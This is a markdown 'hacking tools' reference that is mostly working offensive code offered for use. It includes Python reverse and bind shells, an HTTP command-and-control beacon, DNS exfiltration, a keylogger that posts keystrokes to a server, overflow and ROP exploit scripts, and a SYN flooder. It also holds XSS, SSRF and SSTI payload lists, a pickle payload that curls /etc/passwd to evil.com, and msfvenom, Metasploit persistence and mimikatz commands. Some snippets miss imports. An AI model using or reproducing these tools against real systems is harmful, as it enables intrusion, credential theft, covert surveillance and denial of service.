# Hacking Tools -- Advanced Reference

## Table of Contents

1. [Kali Linux Tools](#kali-linux)
2. [Metasploit](#metasploit)
3. [C2 Frameworks](#c2-frameworks)
4. [Burp Suite](#burp-suite)
5. [Custom Python Hacking Tools](#python-tools)
6. [Binary Exploitation](#binary-exploitation)
7. [Web Exploitation](#web-exploitation)
8. [Wireless Attacks](#wireless)
9. [Mobile Security](#mobile)
10. [Cloud Security](#cloud)
11. [Scapy for Packet Manipulation](#scapy)
12. [Custom Payloads](#payloads)
13. [Encryption/Decryption](#crypto)
14. [Steganography](#stego)
15. [Side-Channel Attacks](#side-channel)

---

## Kali Linux Tools Directory

### Information Gathering

| Tool | Purpose |
|------|---------|
| nmap | Port scanning, service detection |
| masscan | Fast internet-scale port scanning |
| netdiscover | ARP-based network discovery |
| dnsrecon | DNS enumeration |
| dnsenum | DNS zone transfer |
| theHarvester | Email/subdomain harvesting |
| recon-ng | Web reconnaissance framework |
| Maltego | Link analysis/graphing |
| Shodan | Internet device search engine |
| whois | Domain registration lookup |

### Vulnerability Analysis

| Tool | Purpose |
|------|---------|
| OpenVAS | Vulnerability scanner |
| nikto | Web server scanner |
| wapiti | Web app vulnerability scanner |
| sqlmap | Automated SQL injection |
| legion | Auto Nmap/SSH/Brute |
| nuclei | Fast template-based scanner |

### Exploitation

| Tool | Purpose |
|------|---------|
| Metasploit | Exploitation framework |
| searchsploit | Exploit-DB local search |
| BeEF | Browser exploitation |
| RouterSploit | Router exploit framework |
| evilginx | Phishing reverse proxy |
| setoolkit | Social engineering toolkit |

### Post-Exploitation

| Tool | Purpose |
|------|---------|
| mimikatz | Windows credential extraction |
| bloodhound | Active Directory mapping |
| empire | PowerShell post-exploitation |
| powerview | AD enumeration |
| chisel | Tunnel/port forwarding |
| netcat | TCP/IP swiss army knife |
| socat | Advanced networking relay |

### Password Attacks

| Tool | Purpose |
|------|---------|
| hashcat | GPU-based hash cracking |
| john | CPU-based hash cracking |
| hydra | Online brute force |
| medusa | Parallel brute force |
| crunch | Wordlist generation |
| cewl | Website wordlist extraction |
| rsmangler | Wordlist mutation |

### Wireless

| Tool | Purpose |
|------|---------|
| aircrack-ng | WEP/WPA cracking |
| kismet | Wireless monitoring |
| reaver | WPS PIN attack |
| mdk3 | Deauth/jammer |
| bettercap | MiTM framework |
| wifite2 | Automated wireless auditing |

### Forensics

| Tool | Purpose |
|------|---------|
| autopsy | Disk investigation |
| sleuthkit | File system forensics |
| volatility | Memory analysis |
| binwalk | Firmware analysis |
| foremost | File carving |
| wireshark | Packet analysis |
| tcpdump | CLI packet capture |

### Reverse Engineering

| Tool | Purpose |
|------|---------|
| ghidra | NSA reverse engineering |
| radare2 | Binary analysis framework |
| IDA Free | Disassembler/debugger |
| apktool | APK reverse engineering |
| jadx | DEX to Java decompiler |
| x64dbg | Windows debugger |
| gdb | Linux debugger |
| objdump | Binary inspection |
| strings | Extract strings from binaries |

---

## Metasploit

### Basic Usage

```bash
msfconsole
msf6 > search eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > show options
msf6 > set RHOSTS 192.168.1.100
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.50
msf6 > run
```

### Custom Module Creation

```python
# Custom Metasploit module (Ruby)
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Custom Python Exploit',
      'Description' => 'Triggers buffer overflow in target app',
      'Author' => ['researcher'],
      'References' => [['CVE', '2025-XXXX']],
      'Payload' => {'Space' => 1000, 'BadChars' => "\x00\x0a\x0d"},
    ))

    register_options([
      Opt::RPORT(9999),
      OptString.new('TARGET', [true, 'The target string', 'default']),
    ])
  end

  def check
    connect
    banner = sock.get_once
    disconnect
    banner =~ /vulnerable/
  end

  def exploit
    connect
    buf = rand_text_alpha_upper(100)
    buf << [target.ret].pack('V*')
    buf << make_nops(16)
    buf << payload.encoded
    sock.put(buf)
    handler
    disconnect
  end
end
```

### Resource Scripts

```ruby
# auto.rc -- automated exploitation
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
run -z -j
```

### Meterpreter Post-Exploitation

```ruby
# Load Kiwi (mimikatz)
load kiwi
creds_all
lsa_dump_sam

# Privilege escalation
getsystem
getuid

# Persistence
run persistence -X -i 10 -p 4444 -r 192.168.1.50
run scheduleme

# Lateral movement
psexec
pass_the_hash
```

---

## C2 Frameworks

### Cobalt Strike

Commercial C2 framework with Malleable C2 profiles for traffic shaping.

```python
# Malleable C2 profile concepts
# http-get, http-post, http-stager blocks
# Custom URI, headers, User-Agent, jitter
# Data transform: base64, netbios, mask, prepend/append
# Sleep timers, jitter, user-agent rotation
```

### Sliver (Open Source C2)

```bash
# Server setup
sliver-server
[server] sliver > generate --mtls 192.168.1.50 --save implant.exe
[server] sliver > mtls
[server] sliver > jobs

# Client
sliver-client
[client] sliver > use IMPLANT_ID
[client] sliver > ls
[client] sliver > shell
[client] sliver > execute --output whoami
[client] sliver > sideload shellcode.bin
```

### Mythic (Open Source C2)

```python
# Mythic uses agents written in various languages
# Apfell (JavaScript), Poseidon (Swift), Athena (C#)
# HTTP, HTTPS, DNS, SMB profiles
# Mythic REST API for automation
```

### Havoc (Open Source C2)

```python
# C++/C# implant, Demon agent
# Sleep obfuscation, indirect syscalls
# ETW patching, AMSI bypass
```

---

## Burp Suite

### Proxy & Interception

```bash
# Browser -> Burp Proxy (8080) -> Web Server
# Intercept, modify, forward/drop requests
# HTTP history, WebSocket history
# Target scope configuration
```

### Repeater & Intruder

```python
# Repeater: Manual request modification and resend
# Intruder: Automated parameter fuzzing
#   - Sniper (single position, wordlist)
#   - Battering ram (same value across positions)
#   - Pitchfork (parallel wordlists)
#   - Cluster bomb (cartesian product)

# Common payloads:
# - XSS vectors, SQL injection, path traversal
# - Directory brute force, parameter discovery
# - JSON/XML injection, SSTI templates
```

### Extensions (BApp Store)

| Extension | Purpose |
|-----------|---------|
| Autorize | Authorization testing |
| CO2 | Enhanced Intruder |
| Turbo Intruder | High-speed brute force |
| Collaborator | Out-of-band detection |
| 403 Bypasser | Bypass 403 protections |
| ActiveScan++ | Enhanced scanning |
| JWT Editor | JWT manipulation |
| HTTP Request Smuggler | Request smuggling |

### Custom Scanner Extension

```java
// Burp extension (Java)
import burp.*;

public class CustomScanner implements IScannerCheck {
    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
        // Analyze response for vulnerabilities
        return null;
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        // Active scan logic
        String payload = "<script>alert(1)</script>";
        byte[] checkRequest = insertionPoint.buildRequest(payload.getBytes());
        IHttpRequestResponse checkResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);
        // Analyze response for XSS confirmation
        return null;
    }
}
```

---

## Custom Python Hacking Tools

### Reverse Shell

```python
import socket, subprocess, os

def reverse_shell(lhost, lport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

# Listener side
# nc -lvnp 4444
```

### Bind Shell

```python
import socket, subprocess, os, threading

def bind_shell(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(5)
    while True:
        client, addr = s.accept()
        threading.Thread(target=handle_client, args=(client,)).start()

def handle_client(client):
    os.dup2(client.fileno(), 0)
    os.dup2(client.fileno(), 1)
    os.dup2(client.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])
```

### HTTP C2

```python
import requests, base64, time, subprocess, os

class HTTPC2:
    def __init__(self, server_url, beacon_interval=5):
        self.server = server_url
        self.interval = beacon_interval
        self.session_id = os.urandom(8).hex()

    def beacon(self):
        while True:
            try:
                # Check-in
                resp = requests.get(f"{self.server}/tasks?id={self.session_id}", timeout=10)
                if resp.status_code == 200 and resp.text.strip():
                    task = resp.text.strip()
                    result = self.execute_task(task)
                    requests.post(f"{self.server}/results?id={self.session_id}",
                                  data=result, timeout=10)
            except:
                pass
            time.sleep(self.interval)

    def execute_task(self, task):
        if task.startswith("cmd:"):
            cmd = task[4:]
            return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode(errors="replace")
        elif task.startswith("upload:"):
            path, data = task[7:].split(":", 1)
            with open(path, "wb") as f:
                f.write(base64.b64decode(data))
            return f"Uploaded {path}"
        elif task == "exit":
            os._exit(0)
        return "Unknown task"
```

### DNS Tunneling

```python
import socket, base64, struct, time

def dns_exfiltrate(data, domain, dns_server="8.8.8.8"):
    """Exfiltrate data via DNS queries"""
    encoded = base64.b32encode(data.encode()).decode().lower()
    chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
    for chunk in chunks:
        query = f"{chunk}.{domain}"
        try:
            socket.gethostbyname(query)
        except:
            pass
        time.sleep(0.1)

def dns_c2_server(domain):
    """Simplified DNS C2 server"""
    import scapy.all as scapy
    def handle_packet(pkt):
        if pkt.haslayer(scapy.DNSQR):
            qname = pkt[scapy.DNSQR].qname.decode()
            if qname.endswith(f".{domain}."):
                # Extract data from subdomain
                chunk = qname.split(f".{domain}.")[0]
                try:
                    data = base64.b32decode(chunk.upper())
                    print(f"Received: {data}")
                except:
                    pass
    scapy.sniff(filter="udp port 53", prn=handle_packet, store=0)
```

### Keylogger

```python
import keyboard, json, threading, time, requests

class Keylogger:
    def __init__(self, server_url=None, interval=60):
        self.log = ""
        self.server = server_url
        self.interval = interval
        keyboard.on_release(self.capture)

    def capture(self, event):
        key = event.name
        if len(key) == 1:
            self.log += key
        elif key == "space":
            self.log += " "
        elif key == "enter":
            self.log += "\n"
        elif key == "backspace":
            self.log = self.log[:-1]
        else:
            self.log += f"[{key}]"

    def report(self):
        while True:
            if self.log:
                data = json.dumps({"keystrokes": self.log})
                if self.server:
                    try:
                        requests.post(self.server, data=data, timeout=5)
                    except:
                        pass
                else:
                    print(f"[Keylog] {self.log}")
                self.log = ""
            time.sleep(self.interval)

    def start(self):
        threading.Thread(target=self.report, daemon=True).start()
        keyboard.wait()

# Usage: Keylogger("http://server/collect").start()
```

### Port Scanner

```python
import socket, threading, time

def scan_port(host, port, results):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        result = s.connect_ex((host, port))
        if result == 0:
            try:
                service = socket.getservbyport(port)
            except:
                service = "unknown"
            results.append((port, service))
        s.close()
    except:
        pass

def fast_scan(host, ports=range(1, 1025), threads=100):
    results = []
    pool = []
    for port in ports:
        t = threading.Thread(target=scan_port, args=(host, port, results))
        pool.append(t)
        t.start()
        if len(pool) >= threads:
            for t in pool: t.join()
            pool = []
    for t in pool: t.join()
    return sorted(results)

# Usage
# for port, service in fast_scan("192.168.1.1"):
#     print(f"{port}: {service}")
```

### Vulnerability Scanner

```python
import requests, json

class VulnScanner:
    def __init__(self, target):
        self.target = target
        self.vulnerabilities = []

    def check_headers(self):
        try:
            r = requests.get(f"http://{self.target}", timeout=5)
            headers = r.headers
            missing = []
            if "X-Frame-Options" not in headers:
                missing.append("X-Frame-Options (clickjacking)")
            if "X-Content-Type-Options" not in headers:
                missing.append("X-Content-Type-Options (MIME sniff)")
            if "Content-Security-Policy" not in headers:
                missing.append("Content-Security-Policy (XSS)")
            if "Strict-Transport-Security" not in headers:
                missing.append("Strict-Transport-Security (HTTPS)")
            if missing:
                self.vulnerabilities.append({"type": "missing_headers", "details": missing})
        except:
            pass

    def check_dir_traversal(self, path="/../../etc/passwd"):
        try:
            r = requests.get(f"http://{self.target}{path}", timeout=5)
            if "root:" in r.text:
                self.vulnerabilities.append({"type": "path_traversal", "path": path})
        except:
            pass

    def check_open_redirect(self, path="/redirect?url=http://evil.com"):
        try:
            r = requests.get(f"http://{self.target}{path}", timeout=5, allow_redirects=False)
            if "evil.com" in r.headers.get("Location", ""):
                self.vulnerabilities.append({"type": "open_redirect", "path": path})
        except:
            pass

    def run(self):
        self.check_headers()
        self.check_dir_traversal()
        self.check_open_redirect()
        return self.vulnerabilities
```

### Fuzzer

```python
import requests, threading, queue, time

class Fuzzer:
    def __init__(self, url, param, wordlist, threads=10):
        self.url = url
        self.param = param
        self.wordlist = wordlist
        self.threads = threads
        self.q = queue.Queue()
        self.results = []

    def worker(self):
        while not self.q.empty():
            try:
                payload = self.q.get()
                r = requests.get(self.url, params={self.param: payload}, timeout=5)
                if r.status_code not in [404, 400]:
                    status = r.status_code
                    length = len(r.content)
                    self.results.append((payload, status, length))
                self.q.task_done()
            except:
                pass

    def run(self):
        for word in self.wordlist:
            self.q.put(word)
        threads = [threading.Thread(target=self.worker) for _ in range(self.threads)]
        for t in threads: t.start()
        self.q.join()
        return self.results
```

---

## Binary Exploitation

### Stack Buffer Overflow

```python
# Classic stack overflow example
def exploit_buffer_overflow(lhost, lport, target_ip, target_port):
    import struct, socket

    # Finding offset
    # pattern_create.rb -l 2000
    # pattern_offset.rb -q <EIP value>

    offset = 1034
    eip = struct.pack("<I", 0x625014DF)  # JMP ESP address
    nopsled = b"\x90" * 16

    # msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport -b "\x00" -f python
    shellcode = b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
    # ... (full shellcode truncated for brevity)

    payload = b"A" * offset + eip + nopsled + shellcode
    payload += b"\x90" * (2000 - len(payload))

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.send(payload)
    s.close()
```

### ROP Chain

```python
import struct

def build_rop_chain():
    """Return-Oriented Programming chain"""
    # Find gadgets in binary/DLL with:
    # ROPgadget --binary program.exe
    # msfpescan -p program.exe

    # Gadgets (addresses from target binary)
    POP_RET = 0x00401234
    POP_POP_RET = 0x00401236
    XOR_EAX_EAX_RET = 0x00401456
    MOV_EAX_ESP_RET = 0x00401678
    CALL_EAX = 0x00401890
    VIRTUALPROTECT = 0x0041A000  # kernel32.VirtualProtect
    WRITABLE_PTR = 0x0042B000

    chain = []

    # Stage 1: Make stack executable
    chain.extend([
        struct.pack("<I", POP_RET),
        struct.pack("<I", WRITABLE_PTR),  # lpAddress
        struct.pack("<I", VIRTUALPROTECT),  # call VirtualProtect
    ])

    return b"".join(chain)

def exploit_with_rop(target, payload):
    import socket
    offset = 1034
    rop = build_rop_chain()
    buf = b"A" * offset + rop + payload
    s = socket.socket()
    s.connect(target)
    s.send(buf)
    s.close()
```

### Heap Spraying

```python
# Heap spraying via JavaScript in browser
def heap_spray(driver, shellcode):
    shellcode_bytes = ','.join(str(b) for b in shellcode)
    # Build JS that allocates many heap blocks containing shellcode
    js = '''
    var shellcode = [SHELLCODE_BYTES];
    var nopsled = [];
    for (var i = 0; i < 0x20000; i++) nopsled.push(0x90);
    var spray = nopsled.concat(shellcode);
    var blocks = [];
    for (var i = 0; i < 200; i++) {
        var ua = new Uint8Array(0x100000);
        ua.set(spray);
        blocks.push(ua);
    }
    '''.replace('SHELLCODE_BYTES', shellcode_bytes)
    driver.execute_script(js)
```

### Format String

```python
def format_string_exploit(target_ip, target_port):
    import socket

    # %x - hex, %n - write bytes, %s - read string
    # %<offset>$n - write to specific parameter offset

    # Leak stack
    payload = b"AAAA"
    payload += b".%08x" * 20  # leak 20 stack values

    # Write to GOT entry
    # Format: <target_addr><padding>%<value>c%<offset>$n
    target_addr = 0x0804A024  # GOT entry for printf
    payload = struct.pack("<I", target_addr)
    payload += b"%10$n"  # write to first parameter (our addr)

    s = socket.socket()
    s.connect((target_ip, target_port))
    s.send(payload + b"\n")
    print(s.recv(4096))
    s.close()
```

---

## Web Exploitation

### XSS (Cross-Site Scripting)

```python
# Reflected: <script>alert(1)</script>
# Stored: injected into database, served to all users
# DOM-based: client-side JS execution

# Polyglot XSS
xss_payloads = [
    "'';!--"<XSS>=&{()}",
    "<SCRIPT>alert('XSS')</SCRIPT>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>",
    "<details/open/ontoggle=alert(1)>",
    "<body onload=alert(1)>"
]

# CSP bypass attempts
csp_bypass = [
    "<script src='https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js'></script>",
    "<script>$.getScript('//evil.com/xss.js')</script>",
    "<meta http-equiv='refresh' content='0;url=//evil.com'>"
]
```

### CSRF (Cross-Site Request Forgery)

```python
# Craft a forged request that executes in victim's session
csrf_payload = '''
<html>
<body>
  <form action="https://victim.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker" />
    <input type="hidden" name="amount" value="1000" />
    <input type="submit" value="Click here!" />
  </form>
  <script>document.forms[0].submit();</script>
</body>
</html>
'''

# CSRF token bypass techniques
# - Remove token and test if still accepted
# - Replace with same-length arbitrary token
# - Test if token is tied to session
# - Use another valid token from same session
```

### SSRF (Server-Side Request Forgery)

```python
ssrf_payloads = [
    # Localhost access
    "http://127.0.0.1:80",
    "http://localhost:8080",
    "http://[::1]:22",
    "http://0.0.0.0:3306",

    # Cloud metadata endpoints
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/",
    "http://100.100.100.200/latest/meta-data/",

    # Internal services
    "file:///etc/passwd",
    "gopher://redis:6379/_*2%0d%0a$4%0d%0aPING",
    "dict://localhost:11211/",
]

def detect_ssrf(url, param):
    import requests
    for payload in ssrf_payloads:
        try:
            r = requests.get(url, params={param: payload}, timeout=5)
            if "root:" in r.text or "ami-" in r.text:
                print(f"SSRF detected with: {payload}")
        except:
            pass
```

### SSTI (Server-Side Template Injection)

```python
# Detect: {{7*7}} should render 49
# Jinja2: {{config}}, {{''.__class__.__mro__}}, {{cycler.__init__.__globals__.os.popen('id').read()}}
# Twig: {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
# Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
# Velocity: #set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("exec","".split("").getClass()).invoke($e.getRuntime(),"id")

ssti_payloads = [
    "{{7*7}}",
    "{{config}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{''.__class__.__mro__[2].__subclasses__()[X].__init__.__globals__['os'].popen('id').read()}}",
    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    "{% import os %}{{os.popen('id').read()}}",
]
```

### Deserialization

```python
# Python pickle RCE
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://evil.com/exfil?data=$(cat /etc/passwd | base64)',))

payload = pickle.dumps(RCE())

# PHP deserialization
php_payload = 'O:8:"stdClass":0:{}'  # Simple PHP object

# Java deserialization (ysoserial)
# java -jar ysoserial.jar CommonsCollections1 'curl http://evil.com' > payload.bin
```

### Prototype Pollution (JS)

```python
# Prototype pollution payloads
pollution_payloads = [
    {"__proto__": {"isAdmin": True}},
    {"constructor": {"prototype": {"isAdmin": True}}},
    '{"__proto__": {"polluted": true}}',
]

# Detection
# JSON.parse('{"__proto__": {"test": true}}')
# After: {}.test === true  -> vulnerable

# Exploitation examples
# - Pollute Object.prototype with properties the app checks
# - Override toString/valueOf for RCE
# - Set __proto__.shell = true for shell access
```

---

## Wireless Attack Frameworks

### aircrack-ng

```bash
# Monitor mode
airmon-ng start wlan0

# Capture packets
airodump-ng wlan0mon
airodump-ng -c 6 --bssid XX:XX -w capture wlan0mon

# Deauth attack (capture WPA handshake)
aireplay-ng -0 5 -a XX:XX -c YY:YY wlan0mon

# Crack WPA password
aircrack-ng -w wordlist.txt capture-01.cap
```

### Bettercap

```bash
# ARP spoofing
bettercap -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on"

# HTTP/HTTPS interception
set http.proxy.sslstrip true
http.proxy on
https.proxy on

# Credential capture
net.sniff on
```

### Wi-Fi Pentesting Tools

| Tool | Purpose |
|------|---------|
| hcxdumptool | Raw PMKID capture |
| hcxpcapngtool | Convert to hashcat format |
| hashcat -m 22000 | WPA3 crack |
| cowpatty | WPA-PSK crack |
| pyrit | GPU WPA cracking |
| airgeddon | All-in-one script |
| wifiphisher | Rogue AP with phishing |
| fluxion | Evil twin attack |

---

## Mobile Security Testing

### Android

| Tool | Purpose |
|------|---------|
| apktool | APK decompile/recompile |
| jadx | DEX to Java source |
| frida | Dynamic instrumentation |
| objection | Mobile exploration |
| drozer | Security assessment |
| Mobile Security Framework | Automated analysis |
| adb | Device bridge |

### iOS

| Tool | Purpose |
|------|---------|
| class-dump | Objective-C header dump |
| hopper | Disassembler |
| frida-ios-dump | IPA extraction |
| needle | iOS security framework |
| objection | Mobile exploration |
| idb | iOS debugging bridge |

```python
# Frida script for bypassing root detection
frida_script = '''
Java.perform(function() {
    var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
    RootBeer.isRooted.implementation = function() {
        return false;
    };
});
'''

# Objection bypass example
# objection -g com.app explore
# android root disable
# ios jailbreak disable
# android sslpinning disable
```

---

## Cloud Security

### AWS

| Tool | Purpose |
|------|---------|
| pacu | AWS exploitation |
| scoutsuite | Multi-cloud auditor |
| cloudmapper | AWS network analysis |
| s3scanner | S3 bucket enumeration |
| prowler | CIS benchmarks |

### GCP

| Tool | Purpose |
|------|---------|
| gcp_scanner | GCP resource scanner |
| gcp_enum | GCP enumeration |
| cloudsploit | Multi-cloud scanner |

### Azure

| Tool | Purpose |
|------|---------|
| stormspotter | Azure graph explorer |
| azucar | Azure auditing |
| microburst | Azure security tools |

---

## Scapy for Packet Manipulation

```python
import scapy.all as scapy

# Craft packets
syn = scapy.IP(dst="192.168.1.1")/scapy.TCP(dport=80, flags="S")
syn_ack = scapy.sr1(syn, timeout=1)

# ARP scan
def arp_scan(iface, subnet):
    arp = scapy.ARP(pdst=subnet)
    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    result = scapy.srp(packet, iface=iface, timeout=2, verbose=0)[0]
    return [rcv.psrc for sent, rcv in result]

# DNS query
dns = scapy.IP(dst="8.8.8.8")/scapy.UDP(dport=53)/scapy.DNS(qr=0, qd=scapy.DNSQR(qname="example.com"))
answer = scapy.sr1(dns, timeout=2)
answer.show()

# TCP SYN flood
def syn_flood(target_ip, target_port, count=1000):
    for i in range(count):
        ip = scapy.IP(src=f"{10}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                      dst=target_ip)
        syn = ip/scapy.TCP(sport=random.randint(1024,65535), dport=target_port, flags="S")
        scapy.send(syn, verbose=0)

# Custom HTTP request
http_request = b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"
packet = scapy.IP(dst="93.184.216.34")/scapy.TCP(dport=80, flags="PA")/scapy.Raw(load=http_request)
```

---

## Custom Payloads

### Shellcode Generation

```bash
# Linux x64 reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f c

# Windows Meterpreter HTTPS
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=evil.com LPORT=443 -f exe -o payload.exe

# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o evil.apk

# Python shellcode
msfvenom -p python/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw

# Web shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php

# MacOS
msfvenom -p osx/x64/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f macho
```

### Custom Shellcode (x64 Linux)

```python
import subprocess

# Linux x64 execve("/bin/sh", NULL, NULL) shellcode
shellcode = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

# Custom execve shellcode
def execve_shellcode(cmd):
    # Builds a minimal execve shellcode for given command
    # This is a simplified example
    asm = f'''
    xor rsi, rsi
    xor rdx, rdx
    mov rdi, 0x68732f6e69622f  /* /bin/sh */
    push rdi
    mov rdi, rsp
    push 0x3b
    pop rax
    syscall
    '''
    return subprocess.check_output(["nasm", "-f", "bin"], input=asm.encode())

# Encoders (avoid bad chars)
# XOR encoder
def xor_encode(shellcode, key=0xAA):
    return bytes([b ^ key for b in shellcode]) + bytes([key])

# Alpha-numeric encoder
# Use msfvenom -e x86/alpha_mixed
```

---

## Encryption/Decryption

```python
import hashlib, base64, os
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import rsa, padding

# AES encryption
def aes_encrypt(data, key):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    encryptor = cipher.encryptor()
    # PKCS7 padding
    pad_len = 16 - (len(data) % 16)
    data += bytes([pad_len] * pad_len)
    ct = encryptor.update(data) + encryptor.finalize()
    return iv + ct

def aes_decrypt(data, key):
    iv, ct = data[:16], data[16:]
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    decryptor = cipher.decryptor()
    pt = decryptor.update(ct) + decryptor.finalize()
    # Remove padding
    pad_len = pt[-1]
    return pt[:-pad_len]

# RSA encryption
def rsa_keygen():
    private = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public = private.public_key()
    return private, public

# Fernet (symmetric)
key = Fernet.generate_key()
f = Fernet(key)
token = f.encrypt(b"secret data")
print(f.decrypt(token))

# Hash functions
md5 = hashlib.md5(b"data").hexdigest()
sha1 = hashlib.sha1(b"data").hexdigest()
sha256 = hashlib.sha256(b"data").hexdigest()
bcrypt_hash = "$2b$12$..."

# Hash cracking with hashcat
# hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a
```

---

## Steganography

```python
from PIL import Image
import numpy as np

# LSB image steganography
def lsb_encode(image_path, data, output_path):
    img = Image.open(image_path)
    arr = np.array(img)
    flat = arr.flatten()

    # Add length prefix (4 bytes)
    data_bytes = len(data).to_bytes(4, 'big') + data.encode() if isinstance(data, str) else data
    bits = ''.join(format(b, '08b') for b in data_bytes)

    if len(bits) > len(flat):
        raise ValueError("Data too large for image")

    for i, bit in enumerate(bits):
        flat[i] = (flat[i] & 0xFE) | int(bit)

    result = Image.fromarray(flat.reshape(arr.shape))
    result.save(output_path)

def lsb_decode(image_path):
    img = Image.open(image_path)
    arr = np.array(img).flatten()

    # Extract length (first 32 bits)
    length_bits = ''.join(str(arr[i] & 1) for i in range(32))
    length = int(length_bits, 2)

    # Extract data
    data_bits = ''.join(str(arr[i] & 1) for i in range(32, 32 + length * 8))
    data = bytes(int(data_bits[i:i+8], 2) for i in range(0, len(data_bits), 8))
    return data

# Audio steganography
def audio_stego_encode(audio_path, message, output_path):
    import librosa, soundfile as sf
    y, sr = librosa.load(audio_path, sr=None)
    bits = ''.join(format(b, '08b') for b in message.encode())
    if len(bits) > len(y):
        raise ValueError("Message too long")
    for i, bit in enumerate(bits):
        y[i] = (int(y[i] * 32768) & 0xFFFE) | int(bit)
    sf.write(output_path, y / 32768, sr)

# Tools: steghide, binwalk, foremost, zsteg, stegsolve
```

---

## Side-Channel Attacks

### Timing Attack

```python
import time
import requests

def timing_attack(url, username):
    """Exploit timing differences in password comparison"""
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    found = ""

    for pos in range(20):  # max length
        max_time = 0
        best_char = ""
        for c in chars:
            test_pass = found + c + "a" * (19 - len(found))
            times = []
            for _ in range(5):
                start = time.time()
                requests.post(url, data={"user": username, "pass": test_pass})
                elapsed = time.time() - start
                times.append(elapsed)
            avg = sum(times) / len(times)
            if avg > max_time:
                max_time = avg
                best_char = c
        found += best_char
        print(f"Progress: {found}")
    return found
```

### Rowhammer

```python
# Rowhammer: Repeated access to DRAM rows causes bit flips in adjacent rows
# Requires physical memory access or Javascript via cache eviction
# Target: DDR3/DDR4 memory, ECC gives some protection
# Mitigated via TRR (Target Row Refresh) in newer DDR4

# Approaches:
# 1. CLFLUSH-based (native)
# 2. Cache eviction (JavaScript)
# 3. DMA-based
```

### Spectre & Meltdown

```python
# Spectre (CVE-2017-5753, CVE-2017-5715)
# Exploits speculative execution to read kernel/program memory
# Affects: Intel, AMD, ARM CPUs

# Meltdown (CVE-2017-5754)
# Breaks kernel/userspace isolation
# Affects: Intel CPUs primarily

# Mitigation: KPTI (Kernel Page Table Isolation), microcode updates, LFENCE serialization

# Simplified concept:
# 1. Train branch predictor to mispredict
# 2. Execute out-of-bounds access in speculative execution
# 3. Encode data into cache state via microarchitectural side channel
# 4. Measure cache timing to recover data
```
